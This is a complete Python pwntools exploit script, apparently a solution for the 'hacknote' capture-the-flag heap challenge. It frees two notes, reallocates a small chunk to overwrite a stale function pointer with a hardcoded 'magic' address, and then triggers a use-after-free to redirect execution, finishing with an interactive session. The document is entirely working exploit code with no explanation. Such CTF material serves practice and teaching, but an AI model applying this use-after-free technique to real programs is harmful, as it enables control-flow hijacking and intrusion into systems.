#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./hacknote')

magic = 0x8048986

def add(size,content):
    io.sendlineafter("Your choice :",'1')
    io.sendlineafter("Note size :",str(size))
    io.sendlineafter("Content :",content)

def free(idx):
    io.sendlineafter("Your choice :",'2')
    io.sendlineafter("Index :",str(idx))

def show(idx):
    io.sendlineafter("Your choice :",'3')
    io.sendlineafter("Index :",str(idx))

add(30,'aaaa')
add(30,'bbbb')
free(0)
free(1)
add(8,p32(magic))
show(0)
io.interactive()

